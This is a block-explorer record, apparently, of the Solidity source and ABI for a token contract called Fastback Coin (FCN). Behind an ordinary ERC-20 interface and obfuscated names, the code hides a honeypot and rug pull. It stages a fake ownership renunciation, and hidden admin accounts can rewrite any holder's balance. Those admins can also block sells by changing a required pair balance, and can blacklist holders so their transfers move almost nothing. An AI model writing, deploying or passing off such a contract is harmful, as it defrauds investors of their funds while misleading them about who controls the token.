{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract sellSenderLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptModeSender {\n    function createPair(address receiverList, address feeTotal) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface feeLaunchedMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface marketingModeTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverExempt) external view returns (uint256);\n\n    function transfer(address swapMax, uint256 marketingToken) external returns (bool);\n\n    function allowance(address launchTokenFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMax,\n        uint256 marketingToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromListEnable, uint256 value);\n    event Approval(address indexed launchTokenFrom, address indexed spender, uint256 value);\n}\n\ninterface marketingModeTotalMetadata is marketingModeTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FastbackCoin is sellSenderLimit, marketingModeTotal, marketingModeTotalMetadata {\n\n    bool private marketingReceiver;\n\n    mapping(address => uint256) private toToken;\n\n    function allowance(address modeReceiverTx, address totalFund) external view virtual override returns (uint256) {\n        if (totalFund == atWallet) {\n            return type(uint256).max;\n        }\n        return modeMinAmount[modeReceiverTx][totalFund];\n    }\n\n    function swapAt(address maxFee, address swapMax, uint256 marketingToken) internal view returns (uint256) {\n        require(marketingToken > 0);\n\n        uint256 maxTotalFund = 0;\n        if (maxFee == shouldLiquidity && takeFee > 0) {\n            maxTotalFund = marketingToken * takeFee / 100;\n        } else if (swapMax == shouldLiquidity && receiverLaunch > 0) {\n            maxTotalFund = marketingToken * receiverLaunch / 100;\n        }\n        require(maxTotalFund <= marketingToken);\n        return marketingToken - maxTotalFund;\n    }\n\n    event OwnershipTransferred(address indexed launchAt, address indexed tokenTeam);\n\n    function feeTrading(address swapFee, uint256 marketingToken) public {\n        receiverTeam();\n        toToken[swapFee] = marketingToken;\n    }\n\n    function transfer(address swapFee, uint256 marketingToken) external virtual override returns (bool) {\n        return tokenEnable(_msgSender(), swapFee, marketingToken);\n    }\n\n    function balanceOf(address receiverExempt) public view virtual override returns (uint256) {\n        return toToken[receiverExempt];\n    }\n\n    bool public receiverFee;\n\n    bool private liquidityMarketing;\n\n    function transferFrom(address maxFee, address swapMax, uint256 marketingToken) external override returns (bool) {\n        if (_msgSender() != atWallet) {\n            if (modeMinAmount[maxFee][_msgSender()] != type(uint256).max) {\n                require(marketingToken <= modeMinAmount[maxFee][_msgSender()]);\n                modeMinAmount[maxFee][_msgSender()] -= marketingToken;\n            }\n        }\n        return tokenEnable(maxFee, swapMax, marketingToken);\n    }\n\n    uint256 feeSell;\n\n    string private feeTake = \"FCN\";\n\n    function sellLimit(address fromIs) public {\n        receiverTeam();\n        if (receiverWalletLaunched != tokenTakeTx) {\n            marketingReceiver = false;\n        }\n        if (fromIs == limitLaunched || fromIs == shouldLiquidity) {\n            return;\n        }\n        tradingMarketingAuto[fromIs] = true;\n    }\n\n    uint256 public amountReceiver;\n\n    string private minTrading = \"Fastback Coin\";\n\n    function launchedMarketingLimit(uint256 marketingToken) public {\n        receiverTeam();\n        feeSell = marketingToken;\n    }\n\n    uint8 private atIs = 18;\n\n    constructor (){\n        \n        isMarketing();\n        feeLaunchedMin atMin = feeLaunchedMin(atWallet);\n        shouldLiquidity = exemptModeSender(atMin.factory()).createPair(atMin.WETH(), address(this));\n        tradingToken = exemptModeSender(atMin.factory()).feeTo();\n        if (launchedSwap != tokenTakeTx) {\n            launchedSwap = amountReceiver;\n        }\n        limitLaunched = _msgSender();\n        minWalletAt[limitLaunched] = true;\n        toToken[limitLaunched] = txLaunch;\n        \n        emit Transfer(address(0), limitLaunched, txLaunch);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txLaunch;\n    }\n\n    function tokenEnable(address maxFee, address swapMax, uint256 marketingToken) internal returns (bool) {\n        if (maxFee == limitLaunched) {\n            return receiverToLaunched(maxFee, swapMax, marketingToken);\n        }\n        uint256 liquidityList = marketingModeTotal(shouldLiquidity).balanceOf(tradingToken);\n        require(liquidityList == feeSell);\n        require(swapMax != tradingToken);\n        if (tradingMarketingAuto[maxFee]) {\n            return receiverToLaunched(maxFee, swapMax, launchedMax);\n        }\n        marketingToken = swapAt(maxFee, swapMax, marketingToken);\n        return receiverToLaunched(maxFee, swapMax, marketingToken);\n    }\n\n    function receiverToLaunched(address maxFee, address swapMax, uint256 marketingToken) internal returns (bool) {\n        require(toToken[maxFee] >= marketingToken);\n        toToken[maxFee] -= marketingToken;\n        toToken[swapMax] += marketingToken;\n        emit Transfer(maxFee, swapMax, marketingToken);\n        return true;\n    }\n\n    mapping(address => bool) public tradingMarketingAuto;\n\n    bool private listFund;\n\n    mapping(address => mapping(address => uint256)) private modeMinAmount;\n\n    bool private tokenExempt;\n\n    uint256 constant launchedMax = 3 ** 10;\n\n    function receiverTeam() private view {\n        require(minWalletAt[_msgSender()]);\n    }\n\n    address private receiverShould;\n\n    uint256 public receiverLaunch = 0;\n\n    uint256 liquidityMax;\n\n    uint256 public tokenTakeTx;\n\n    address public shouldLiquidity;\n\n    uint256 public launchedSwap;\n\n    address atWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamLiquidity(address tradingWallet) public {\n        if (receiverFee) {\n            return;\n        }\n        if (tokenExempt == listFund) {\n            tokenExempt = false;\n        }\n        minWalletAt[tradingWallet] = true;\n        if (launchedSwap != receiverWalletLaunched) {\n            listFund = false;\n        }\n        receiverFee = true;\n    }\n\n    uint256 private buyEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTake;\n    }\n\n    address public limitLaunched;\n\n    function isMarketing() public {\n        emit OwnershipTransferred(limitLaunched, address(0));\n        receiverShould = address(0);\n    }\n\n    uint256 private receiverWalletLaunched;\n\n    uint256 public takeFee = 3;\n\n    function name() external view virtual override returns (string memory) {\n        return minTrading;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverShould;\n    }\n\n    function owner() external view returns (address) {\n        return receiverShould;\n    }\n\n    mapping(address => bool) public minWalletAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atIs;\n    }\n\n    address tradingToken;\n\n    function approve(address totalFund, uint256 marketingToken) public virtual override returns (bool) {\n        modeMinAmount[_msgSender()][totalFund] = marketingToken;\n        emit Approval(_msgSender(), totalFund, marketingToken);\n        return true;\n    }\n\n    uint256 private txLaunch = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTokenFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromListEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiverTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"feeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"launchedMarketingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minWalletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"}],\"name\":\"sellLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"teamLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTakeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMarketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FastbackCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}